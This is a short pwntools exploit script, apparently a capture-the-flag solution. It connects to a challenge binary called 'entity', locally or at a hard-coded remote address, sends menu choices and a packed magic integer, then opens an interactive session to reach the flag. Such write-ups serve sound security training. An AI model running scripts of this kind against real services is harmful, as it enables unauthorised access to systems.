#!/usr/bin/env python3

from pwn import *

host,port = '142.93.39.188',31999
pwn = './entity'
gdbscript = '''
b get_flag
'''
context.terminal = 'kitty'

def conn():
	if args.REMOTE:
		return remote(host,port)
	elif args.GDB:
		return gdb.debug(pwn,gdbscript=gdbscript)
	else:
		return process(pwn)

io = conn()

io.recvuntil(b'>> ')
io.sendline(b'T')
sleep(1)
io.recvuntil(b'>> ')
io.sendline(b'S')
sleep(1)
io.recvuntil(b'>> ')
io.sendline(p64(13371337))
sleep(1)
io.recvuntil(b'>> ')
io.sendline(b'C')
io.interactive()
